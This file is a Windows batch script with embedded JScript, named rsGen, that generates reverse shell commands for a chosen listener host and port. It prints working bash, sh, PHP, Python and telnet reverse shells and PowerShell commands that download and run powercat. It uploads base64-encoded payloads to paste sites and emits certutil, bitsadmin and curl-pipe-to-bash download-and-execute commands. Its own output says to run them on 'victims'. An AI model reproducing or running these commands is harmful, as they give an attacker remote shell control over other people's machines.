@if (@rsgen) == (@RSGEN) @end /***** JS
@echo off
title rsGen - Universal Reverse Shell Command Genrator by Flyfish

::main
:rs_main_start
setlocal enableDelayedExpansion
call :rs_os_detect_start
if "%~1" equ "" (
    if "!rs_os_flag!"=="W10" (
        call :rs_banner_w10_start
    ) else (
        call :rs_banner_start
    )
    goto rs_help_start
) else (
    set rs_listen_host=
    set rs_listen_host=%~1
    call :rs_check_host_start !rs_listen_host!
    if "!rs_value_type!"=="1" (
        if "!rs_os_flag!"=="W10" (
            call :rs_banner_w10_start
            echo,&echo  [91m-Wrong ip argument[0m
        ) else (
            call :rs_banner_start
            echo,
            powershell -c write-host "' - Wrong ip argument'" -f red -n 2>nul
        )
        goto rs_help_start
    ) else (
        if "%~2" equ "" (
            if "!rs_os_flag!"=="W10" (
                call :rs_banner_w10_start
                echo,&echo  [91m-Missing port argument[0m
            ) else (
                call :rs_banner_Start
                echo,
                powershell -c write-host "' - Missing port argument'" -f red -n 2>nul
            )
            goto rs_help_start
        ) else (
            set rs_listen_port=
            set rs_listen_port=%~2
            call :rs_check_port_start !rs_listen_port!
            if "!rs_value_type!"=="1" (
                if "!rs_os_flag!"=="W10" (
                    call :rs_banner_w10_start
                    echo,&echo  [91m-Wrong port argument[0m
                ) else (
                    call :rs_banner_start
                    echo,
                    powershell -c write-host "' - Wrong port argument'" -f red -n 2>nul
                )
                goto rs_help_start
            ) else (
                set rs_webport=80
                    if "!rs_os_flag!"=="W10" (
                        call :rs_banner_w10_start
                    ) else (
                        call :rs_banner_start
                    )
                if not "%3"=="" (
                    for %%i in (%3 %4 %5 %6 %7 %8) do (
                        if /i "%%i"=="-pub" (
                            call :rs_command_generate_pub_start
                        )
                        if /i "%%i"=="-lan" (
                            call :rs_command_lan_start
                        )
                        if /i "%%i"=="-listen" (
                            call :rs_local_listen_start
                        )

                        if /i "%%i"=="-ngrok" (
                            echo  Now ngrok tunnel is not available.
                            goto rs_help_start
                        )
                    )

                ) else (
                    call :rs_command_raw_start
                )
                call :rs_clean_tempfile_start
            )
        )
    )
)
endlocal
goto :eof
:rs_main_end

::Detect system version using ANSI color
:rs_os_detect_start
for /f "tokens=4-7 delims=[]. " %%i in ('ver') do (
    set /a_majorminor=%%i * 100 + %%j
    set /a_build=%%k0 /10
    set /a_revision=%%l0 /10
)
set "rs_os_flag="
if %_majorminor% geq 1000 (
    if %_build% gtr 10586 (
        set rs_os_flag=W10
    )
) else (
    set rs_os_flag=-1
    if %_build% equ 10586 (
        if %_revision% geq 11 (
            set rs_os_flag=W10
        )
    )
)
:rs_os_detect_end

::Check host format
:rs_check_host_start
set rs_value=
set rs_value=%1
echo %rs_value%|findstr "^[a-zA-Z0-9\.]*$">nul
if %errorlevel% equ 0 (
    set rs_value_type=0
) else (
    set rs_value_type=1
) 
goto :eof
:rs_check_host_end

::Check port format
:rs_check_port_start
set rs_value=
set rs_value=%1
echo %rs_value%|findstr "^[0-9]*$">nul
if %errorlevel% equ 0 (
    set rs_value_type=0
) else (
    set rs_value_type=1
)
goto :eof
:rs_check_prot_end

::Find available ports
:rs_set_webport_start
netstat -o -n -a | find /i "LISTENING" | find ":%rs_webport% " > NUL
if "%ERRORLEVEL%" equ "0" (
  set /a rs_webport +=1
  goto rs_set_webport_start
) else (
  set rs_webport=%rs_webport%
)
goto :eof
:rs_set_webport_end

::base64 encode
:rs_base64_encode_start
set /p<nul="%~1">"%temp%\rs_temp_input.rsg"
certutil -f -encode "%temp%\rs_temp_input.rsg" "%temp%\rs_temp_output.rsg">nul
for /f %%i in ('findstr /b /c:"-" /v "%temp%\rs_temp_output.rsg"') do (
    set "rsgen_b64_res=%%i"
)
:rs_base64_encode_ende

::Clean temporary files
:rs_clean_tempfile_start
if exist "%temp%\rs_temp_input.rsg" del /q %temp%\rs_temp_input.rsg
if exist "%temp%\rs_temp_output.rsg" del /q %temp%\rs_temp_output.rsg
goto :eof
:rs_clean_tempfile_end

::Listen to the local port
:rs_local_listen_start
if exist "%cd%\command\powercat.ps1" (
    echo,
    echo Start the listening window
    start "Listening port !rs_listen_port!" cmd /c powershell -ep bypass -c "Import-Module %cd%\command\powercat.ps1;powercat -l -p !rs_listen_port! -v -t 600" 2>nul
) else (
    echo,
    powershell -c write-host "' - Unable to start listening,Missing file %cd%\command\powercat.ps1.'" -f red -n 2>nul
    goto rs_help_start
)

goto :eof
:rs_local_listen_end

::Raw command format output
:rs_command_raw_start
if "!rs_os_flag!"=="W10" (
    echo,
    echo  [93m¡¾Windows Command¡¿[0m
    echo  [92m  powershell -Ep Bypass -NoLogo -NonI -NoP -c IEX^(New-Object System.Net.Webclient^).DownloadString^('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'^);powercat -c !rs_listen_host! -p !rs_listen_port! -e cmd[0m
    echo,
    echo  [93m¡¾Linux Command¡¿[0m
    echo  [92m  bash -i^>^&/dev/tcp/!rs_listen_host!/!rs_listen_port! 0^>^&1[0m
    echo,
    echo  [92m  sh -i^>^&/dev/udp/!rs_listen_host!/!rs_listen_port! 0^>^&1[0m
    echo,
    echo  [92m  0^<^&196;exec 196^<^>/dev/tcp/!rs_listen_host!/!rs_listen_port!; sh ^<^&196 ^>^&196 2^>^&196[0m
    echo,
    echo  [92m  telnet !rs_listen_host! !rs_listen_port!^|/bin/bash^|telnet !rs_listen_host! 1521[0m
    ::echo  [96m  ps:Need to additionally listen a port 1521 for command output display[0m
    echo,
    echo  [92m  php -r '$sock=fsockopen^("!rs_listen_host!",!rs_listen_port!^);exec^("/bin/sh -i <&3 >&3 2>&3"^);'[0m
    echo,
    echo  [92m  python -c 'import socket,subprocess,os;s=socket.socket^(socket.AF_INET,socket.SOCK_STREAM^);s.connect^(^("!rs_listen_host!",!rs_listen_port!^)^);os.dup2^(s.fileno^(^),0^); os.dup2^(s.fileno^(^),1^);os.dup2^(s.fileno^(^),2^);import pty; pty.spawn^("/bin/bash"^)'[0m
) else (
    echo,
    powershell -c write-host "' ¡¾Windows Command¡¿'" -f yellow 2>nul
    echo    powershell -Ep Bypass -NoLogo -NonI -NoP -c IEX^(New-Object System.Net.Webclient^).DownloadString^('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'^);powercat -c !rs_listen_host! -p !rs_listen_port! -e cmd
    echo,
    powershell -c write-host "' ¡¾Linux Command¡¿'" -f yellow 2>nul
    echo    bash -i^>^&/dev/tcp/!rs_listen_host!/!rs_listen_port! 0^>^&1
    echo,
    echo    sh -i^>^&/dev/udp/!rs_listen_host!/!rs_listen_port! 0^>^&1
    echo,
    echo    0^<^&196;exec 196^<^>/dev/tcp/!rs_listen_host!/!rs_listen_port!; sh ^<^&196 ^>^&196 2^>^&196
    echo,
    echo    telnet !rs_listen_host! !rs_listen_port!^|/bin/bash^|telnet !rs_listen_host! 1521
    ::echo    ps:Need to additionally listen a port 1521 for command output display
    echo,
    echo    php -r '$sock=fsockopen^("!rs_listen_host!",!rs_listen_port!^);exec^("/bin/sh -i <&3 >&3 2>&3"^);'
    echo,
    echo    python -c 'import socket,subprocess,os;s=socket.socket^(socket.AF_INET,socket.SOCK_STREAM^);s.connect^(^("!rs_listen_host!",!rs_listen_port!^)^);os.dup2^(s.fileno^(^),0^); os.dup2^(s.fileno^(^),1^);os.dup2^(s.fileno^(^),2^);import pty; pty.spawn^("/bin/bash"^)'
)
echo,
echo    Your command has been generated and you can execute it on Windows/Linux victims.
goto :eof
:rs_command_raw_end

::LAN "transfer command" generation
:rs_command_lan_start
if not exist "%cd%\command\" (
    echo,
    powershell -c write-host "' - Missing command directory,Unable to continue generate command!'" -f red -n >nul
    ::Missing the command directory, the command directory contains the files "i" & "powercat.ps1", "i" is the generated command.
    goto rs_help_start
)
if exist "%cd%\command\mongoose.exe" (
    tasklist|find /i "mongoose.exe">nul&&taskkill /f /im mongoose.exe >nul 2>nul
    call :rs_set_webport_start
    start %cd%\command\mongoose.exe -d %cd%\command\ -l !rs_webport! -start_browser no -enable_dir_listing no
    rem mongoose.exe -d %cd%\www -l 80 -start_browser yes -enable_dir_listing no
) else (
    powershell -c write-host "' - Missing file `"%cd%\command\mongoose.exe`",The web service failed to start`,the LAN mode needs to start the web service locally`,so the command will not be executed effectively'" -f red -n 2>nul
)
set "rs_ps_command_pre_lan=&powershell -EP Bypass -NoLogo -NonI -NoP -Enc "
set "ps_command_suf_raw_lan=IEX (New-Object System.Net.Webclient).DownloadString(''http://%rs_listen_host%:%rs_webport%/powercat.ps1'');powercat -c !rs_listen_host! -p !rs_listen_port! -e cmd"
set "linux_command_raw_lan=/bin/bash -i>&/dev/tcp/!rs_listen_host!/!rs_listen_port! 0>&1"
call :rs_base64_encode_start "!linux_command_raw_lan!"
set rs_linux_command_b64_lan=%rsgen_b64_res%
powershell -c "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('%ps_command_suf_raw_lan%'))|out-file -Encoding ascii %temp%\rs_temp_input.rsg"
set /p rs_ps_command_suf_b64_lan=<%temp%\rs_temp_input.rsg
set "rs_command_b64_lan=!rs_linux_command_b64_lan!!rs_ps_command_pre_lan!!rs_ps_command_suf_b64_lan!"
echo !rs_command_b64_lan!>%cd%\command\i
call :rs_http_post_start "!rs_listen_host!" "%temp%\rs_temp_output.rsg"
set /p rs_ip2dec=<%temp%\rs_temp_output.rsg
if "!rs_os_flag!"=="W10" (
    if "!rs_webport!" equ "80" (
        set rs_webport_display=
    ) else (
        set "rs_webport_display=:%rs_webport%"
    )
    echo,
    echo  [93m¡¾Windows Command¡¿[0m
    echo  [92m  powershell -Ep Bypass -NoLogo -NonI -NoP -c IEX^(New-Object System.Net.Webclient^).DownloadString^('http://!rs_listen_host!!rs_webport_display!/powercat.ps1'^);powercat -c !rs_listen_host! -p !rs_listen_port! -e cmd[0m
    echo,
    echo  [92m  certutil -urlcache -split -f http://!rs_listen_host!!rs_webport_display!/i cd.bat^|cd.bat[0m
    echo,
    echo  [92m  powershell "Import-Module BitsTransfer;start-bitstransfer http://!rs_listen_host!!rs_webport_display!/i cd.bat"^|cd.bat^[0m
    echo,
    echo  [92m  bitsadmin /transfer n http://!rs_listen_host!!rs_webport_display!/i %%cd%%^\cd.bat^|cd.bat[0m
    echo,
    echo  [93m¡¾Linux Command¡¿[0m
    echo  [92m  curl http://!rs_ip2dec!!rs_webport_display!/i^|base64 -d^|bash[0m
    echo,
    echo  [92m  curl http://!rs_listen_host!!rs_webport_display!/i^|base64 -d^|bash[0m
    echo,
    echo  [92m  wget -qO- http://!rs_ip2dec!!rs_webport_display!/i^|base64 -d^|bash[0m
    echo,
    echo  [93m¡¾Win^&Linux¡¿[0m
    echo  [92m  certutil -urlcache -split -f http://!rs_listen_host!!rs_webport_display!/i cd.bat^|cd.bat^|^|curl http://!rs_listen_host!!rs_webport_display!/i^|base64 -d^|bash[0m
    echo,
    echo  [92m  powershell "Import-Module BitsTransfer;start-bitstransfer http://!rs_listen_host!!rs_webport_display!/i cd.bat"^|cd.bat^|^|curl http://!rs_listen_host!!rs_webport_display!/i^|base64 -d^|bash[0m
    echo,
    echo  [92m  bitsadmin /transfer n http://!rs_listen_host!!rs_webport_display!/i %%cd%%\cd.bat^|cd.bat^|^|curl http://!rs_ip2dec!!rs_webport_display!/i^|base64 -d^|bash[0m
    echo,
) else (
    if "!rs_webport!" equ "80" (
        set rs_webport_display=
    ) else (
        set "rs_webport_display=:%rs_webport%"
    )
    echo,
    powershell -c write-host "' ¡¾Windows Command¡¿'" -f yellow 2>nul
    echo    powershell -Ep Bypass -NoLogo -NonI -NoP -c IEX^(New-Object System.Net.Webclient^).DownloadString^('http://!rs_listen_host!!rs_webport_display!/powercat.ps1'^);powercat -c !rs_listen_host! -p !rs_listen_port! -e cmd
    echo,
    echo    certutil -urlcache -split -f http://!rs_listen_host!!rs_webport_display!/i cd.bat^|cd.bat
    echo,
    echo    powershell "Import-Module BitsTransfer;start-bitstransfer http://!rs_listen_host!!rs_webport_display!/i cd.bat"^|cd.bat
    echo,
    echo    bitsadmin /transfer n http://!rs_listen_host!!rs_webport_display!/i %%cd%%^\cd.bat^|cd.bat
    echo,
    powershell -c write-host "' ¡¾Linux Command¡¿'" -f yellow 2>nul
    echo    curl http://!rs_ip2dec!!rs_webport_display!/i^|base64 -d^|bash
    echo,
    echo    curl http://!rs_listen_host!!rs_webport_display!/i^|base64 -d^|bash
    echo,
    echo    wget -qO- http://!rs_ip2dec!!rs_webport_display!/i^|base64 -d^|bash
    echo,
    powershell -c write-host "' ¡¾Win&Linux¡¿'" -f yellow 2>nul
    echo    certutil -urlcache -split -f http://!rs_listen_host!!rs_webport_display!/i cd.bat^|cd.bat^|^|curl http://!rs_listen_host!!rs_webport_display!/i^|base64 -d^|bash
    echo,
    echo    powershell "Import-Module BitsTransfer;start-bitstransfer http://!rs_listen_host!!rs_webport_display!/i cd.bat"^|cd.bat^|^|curl http://!rs_listen_host!!rs_webport_display!/i^|base64 -d^|bash
    echo,
    echo    bitsadmin /transfer n http://!rs_listen_host!!rs_webport_display!/i %%cd%%\cd.bat^|cd.bat^|^|curl http://!rs_ip2dec!!rs_webport_display!/i^|base64 -d^|bash
    echo,
)
echo    Your command has been generated and you can execute it on Windows/Linux victims.
goto :eof
:rs_command_lan_end

::"transfer command" generation
:rs_command_generate_pub_start
set "rs_ps_command_pre=&powershell -EP Bypass -NoLogo -NonI -NoP -Enc "
set "ps_command_suf_raw=IEX (New-Object System.Net.Webclient).DownloadString(''https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'');powercat -c !rs_listen_host! -p !rs_listen_port! -e cmd"
set "linux_command_raw=/bin/bash -i>&/dev/tcp/!rs_listen_host!/!rs_listen_port! 0>&1"
call :rs_base64_encode_start "!linux_command_raw!"
set rs_linux_command_b64=%rsgen_b64_res%
::echo %rs_linux_command_b64%
powershell -c "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('%ps_command_suf_raw%'))|out-file -Encoding ascii %temp%\rs_temp_input.rsg"
set /p rs_ps_command_suf_b64=<%temp%\rs_temp_input.rsg
::echo %rs_ps_command_suf_b64%
set "rs_command_b64=!rs_linux_command_b64!!rs_ps_command_pre!!rs_ps_command_suf_b64!"
::echo !rs_command_b64!>%temp%\rs_command_b64.rsg
call :rs_command_upload_start
if "!rs_pastebin_status!"=="-1" (
    if "!rs_dpaste_status!"=="-1" (
        echo,
	    powershell -c write-host "' Command upload failed, make sure you can access the internet, check local proxy settings, or make sure the pastebin API is available'" -f red 2>nul
        goto rs_help_start
    )
)	
if "!rs_os_flag!"=="W10" (
    echo,
    echo  [93m¡¾Windows Command¡¿[0m
    if "!rs_pastebin_status!"=="0" echo  [92m  certutil -urlcache -split -f !rs_pastebin_url!.txt cd.bat^|cd.bat[0m
    echo,
    if "!rs_dpaste_status!"=="0" echo  [92m  certutil -urlcache -split -f !rs_dpaste_url!.txt cd.bat^|cd.bat[0m
    echo,
    if "!rs_pastebin_status!"=="0" echo  [92m  bitsadmin /transfer n !rs_pastebin_url!.txt %%cd%%\cd.bat^|cd.bat[0m
    echo,
    if "!rs_pastebin_status!"=="0" echo  [92m  powershell "Import-Module bitstransfer;start-bitstransfer !rs_pastebin_url!.txt cd.bat"^|cd.bat[0m
    echo,
    echo  [93m¡¾Linux Command¡¿[0m
    if "!rs_pastebin_status!"=="0" echo  [92m  curl !rs_pastebin_url!.txt^|base64 -d^|bash[0m
    echo,
    if "!rs_dpaste_status!"=="0" echo  [92m  curl !rs_dpaste_url!.txt^|base64 -d^|bash[0m
    echo,
    if "!rs_pastebin_status!"=="0" echo  [92m  wget -qO- !rs_pastebin_url!.txt^|base64 -d^|bash[0m
    echo,
    if "!rs_dpaste_status!"=="0" echo  [92m  wget -qO- !rs_dpaste_url!.txt^|base64 -d^|bash[0m
    echo,
    echo  [93m¡¾Win^&Linux¡¿[0m
    if "!rs_pastebin_status!"=="0" echo  [92m  certutil -urlcache -split -f !rs_pastebin_url!.txt cd.bat^|cd.bat^|^|curl !rs_pastebin_url!.txt^|base64 -d^|bash[0m
    echo,
    if "!rs_dpaste_status!"=="0" echo  [92m  certutil -urlcache -split -f !rs_dpaste_url!.txt cd.bat^|cd.bat^|^|curl !rs_dpaste_url!.txt^|base64 -d^|bash[0m
    echo,
    if "!rs_pastebin_status!"=="0" echo  [92m  bitsadmin /transfer n !rs_pastebin_url!.txt %%cd%%\cd.bat^|cd.bat^|^|curl !rs_pastebin_url!.txt^|base64 -d^|bash[0m
    echo,
    if "!rs_pastebin_status!"=="0" echo  [92m  powershell "Import-Module BitsTransfer;start-bitstransfer !rs_pastebin_url!.txt cd.bat"^|cd.bat^|^|curl !rs_pastebin_url!.txt^|base64 -d^|bash[0m
    echo,
) else (
    echo,
    powershell -c write-host "' ¡¾Windows Command¡¿'" -f yellow 2>nul
    if "!rs_pastebin_status!"=="0" echo    certutil -urlcache -split -f !rs_pastebin_url!.txt cd.bat^|cd.bat
    echo,
    if "!rs_dpaste_status!"=="0" echo    certutil -urlcache -split -f !rs_dpaste_url!.txt cd.bat^|cd.bat
    echo,
    if "!rs_pastebin_status!"=="0" echo    bitsadmin /transfer n !rs_pastebin_url!.txt %%cd%%\cd.bat^|cd.bat
    echo,
    if "!rs_pastebin_status!"=="0" echo    powershell "Import-Module bitstransfer;start-bitstransfer !rs_pastebin_url!.txt cd.bat"^|cd.bat
    echo,
    powershell -c write-host "' ¡¾Linux Command¡¿'" -f yellow 2>nul
    if "!rs_pastebin_status!"=="0" echo    curl !rs_pastebin_url!.txt^|base64 -d^|bash
    echo,
    if "!rs_dpaste_status!"=="0" echo    curl !rs_dpaste_url!.txt^|base64 -d^|bash
    echo,
    if "!rs_pastebin_status!"=="0" echo    wget -qO- !rs_pastebin_url!.txt^|base64 -d^|bash
    echo,
    if "!rs_dpaste_status!"=="0" echo    wget -qO- !rs_dpaste_url!.txt^|base64 -d^|bash
    echo,
    powershell -c write-host "' ¡¾Win&Linux¡¿'" -f yellow 2>nul
    if "!rs_pastebin_status!"=="0" echo    certutil -urlcache -split -f !rs_pastebin_url!.txt cd.bat^|cd.bat^|^|curl !rs_pastebin_url!.txt^|base64 -d^|bash
    echo,
    if "!rs_dpaste_status!"=="0" echo    certutil -urlcache -split -f !rs_dpaste_url!.txt cd.bat^|cd.bat^|^|curl !rs_dpaste_url!.txt^|base64 -d^|bash
    echo,
    if "!rs_pastebin_status!"=="0" echo    bitsadmin /transfer n !rs_pastebin_url!.txt %%cd%%\cd.bat^|cd.bat^|^|curl !rs_dpaste_url!.txt^|base64 -d^|bash
    echo,
    if "!rs_pastebin_status!"=="0" echo    powershell "Import-Module BitsTransfer;start-bitstransfer !rs_pastebin_url!.txt cd.bat"|cd.bat^|^|curl !rs_pastebin_url!.txt^|base64 -d^|bash
    echo,
)
echo    Your command has been generated and you can execute it on Windows/Linux victims.
goto :eof
:rs_command_generate_pub_end

::Upload command to pastebin
:rs_command_upload_start
echo,
echo  * Uploading command to pastebin...
set "url=http://p.ip.fi/"
set "urlfilepath=%temp%\rs_temp_input.rsg"
set "ipfilepath=%temp%\rs_temp_output.rsg"
if exist "%temp%\rs_temp_input.rsg" del /q %temp%\rs_temp_input.rsg
call :rs_http_post_start "%url%" "paste=!rs_command_b64!" "%urlfilepath%" "%rs_listen_host%" "%ipfilepath%"
if exist "%temp%\rs_temp_input.rsg" (
    echo  + Upload command to pastebin Success.
    set rs_pastebin_status=0
    set /p rs_pastebin_url=<%temp%\rs_temp_input.rsg
) else (
    set rs_pastebin_status=-1
    powershell -c write-host "' - Upload command to pastebin Failed!'" -f red 2>nul
)
set "url=http://dpaste.com/api/v2/"
set "urlfilepath=%temp%\rs_temp_input.rsg"
set "ipfilepath=%temp%\rs_temp_output.rsg"
if exist "%temp%\rs_temp_input.rsg" del /q %temp%\rs_temp_input.rsg
call :rs_http_post_start "%url%" "content=!rs_command_b64!" "%urlfilepath%" "%rs_listen_host%" "%ipfilepath%"
if exist "%temp%\rs_temp_input.rsg" (
    echo  + Upload command to dpaste Success.
    set rs_dpaste_status=0
    set /p rs_dpaste_url=<%temp%\rs_temp_input.rsg
) else (
    set rs_dpaste_status=-1
    powershell -c write-host "' - Upload command to dpaste Failed!'" -f red 2>nul
)
goto :eof
:rs_command_upload_end

::Embedded js code to achieve command upload function
:rs_http_post_start
cscript //E:JScript //nologo "%~f0" "%~nx0" %*
goto :eof
@if (@rsgen) == (@RSGEN) @end *****/
var args = WScript.Arguments;
var xhr = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
var AdoDBObj = new ActiveXObject("ADODB.Stream");
if (args.Length == 6 ) {
    url = args.Item(1)
    data = args.Item(2).replace("+", "%2B").replace("&", "%26");
    filename = args.Item(3)
    ip = args.Item(4)
    ipfilename = args.Item(5)
    request(url);
    writeFile(ipfilename,ip2dec(ip));
    WScript.Quit(666);
}
if (args.Length == 4 ) {
    url = args.Item(1)
    data = args.Item(2).replace("+", "%2B").replace("&", "%26");
    filename = args.Item(3)
    request(url);
    WScript.Quit(666);
}
if (args.Length == 3 ) {
    ip = args.Item(1)
    ipfilename = args.Item(2)
    writeFile(ipfilename,ip2dec(ip));
    WScript.Quit(666);
}
if (args.Length == 1 ) {
    WScript.Quit(-1);
}
function request(url) {
    var RESOLVE_TIMEOUT = 50000;
    var CONNECT_TIMEOUT = 10000;
    var SEND_TIMEOUT = 10000;
    var RECEIVE_TIMEOUT = 10000;
    xhr.open('POST', url, false);
    xhr.Option(4) = 13056;
    xhr.SetRequestHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3");
    xhr.SetRequestHeader("Referer", "http://www.baidu.com/")
    xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded")
    xhr.SetRequestHeader("Connection", "Close")
    xhr.SetTimeouts(RESOLVE_TIMEOUT, CONNECT_TIMEOUT, SEND_TIMEOUT, RECEIVE_TIMEOUT);
    try {
        xhr.send(data);
        xhr.WaitForResponse;
        //WScript.Echo(xhr.responseText);
    } catch(e) {
        WScript.Quit(-1);
    }
    writeFile(filename,xhr.responseText);
}
function writeFile(fileName, data) {
    AdoDBObj.Type = 2;
    AdoDBObj.CharSet = "iso-8859-1";
    AdoDBObj.Open();
    AdoDBObj.Position = 0;
    AdoDBObj.WriteText(data);
    AdoDBObj.SaveToFile(fileName, 2);
    AdoDBObj.Close();
}
function ip2dec(ip) {
    var ipreg = /^(\d{0,3}\.){3}.(\d{0,3})$|^(\d{0,3}\.){5}.(\d{0,3})$/;
    var valid = ipreg.test(ip);
    if (!valid) {
        return false;
    }
    var dots = ip.split('.');
    for (var i = 0; i < dots.length; i++) {
        var dot = dots[i];
        if (dot > 255 || dot < 0) {
            return false;
        }
    }
    if (dots.length == 4) {
        return ((((((+dots[0])*256)+(+dots[1]))*256)+(+dots[2]))*256)+(+dots[3]);
    } else {
        return false;
    }
}
@if (@rsgen) == (@RSGEN) @end /***** JS
:rs_http_post_end

::banner
:rs_banner_start
echo                   ______  ________  ____  _____  
echo                 .' ___  ^|^|_   __  ^|^|_   \^|_   _^| 
echo   _ .--.  .--. / .'   \_^|  ^| ^|_ \_^|  ^|   \ ^| ^|   
echo  [ `/'`\]( (`\]^| ^|   ____  ^|  _^| _   ^| ^|\ \^| ^|   
echo   ^| ^|     `'.'.\ `.___]  ^|_^| ^|__/ ^| _^| ^|_\   ^|_  
echo  [___]   [\__) )`._____.'^|________^|^|_____^|\____^|  v1.0
goto :eof
:rs_banner_end

:rs_banner_w10_start
echo  [93m                   ______  ________  ____  _____ 
echo  [93m                 .' ___  ^|^|_   __  ^|^|_   \^|_   _^| [0m 
echo  [92m   _ .--.  .--. [93m/ .'   \_^|  ^| ^|_ \_^|  ^|   \ ^| ^|   
echo  [92m  [ `/'`\]( (`\][93m^| ^|   ____  ^|  _^| _   ^| ^|\ \^| ^|   
echo  [92m   ^| ^|     `'.'.[93m\ `.___]  ^|_^| ^|__/ ^| _^| ^|_\   ^|_  
echo  [92m  [___]   [\__) )[93m`._____.'^|________^|^|_____^|\____^|  [97mv1.0[0m
goto :eof
:rs_banner_w10_end

::help info
:rs_help_start
echo,
echo  An Universal Reverse Shell Command Genrator.(Notice: You need to provide at least host and port parameters,that is your shell ip and port.)
echo,
echo Usage: %~nx0 host port [options]
echo Options:
echo   -pub       Upload to pastebin to generate "transfer command".
echo   -lan       Generate command for LAN only and enable a web service locally
echo   -listen    Generate command and listen the shell port.
echo,
echo Examples: %~nx0 192.168.31.216 8888
echo           %~nx0 192.168.31.216 8888 -pub
echo           %~nx0 192.168.31.216 8888 -lan
echo           %~nx0 192.168.31.216 8888 -listen
echo           %~nx0 192.168.31.216 8888 -lan -listen
exit /b 0
:rs_help_end
@if (@rsgen) == (@RSGEN) @end JS *****/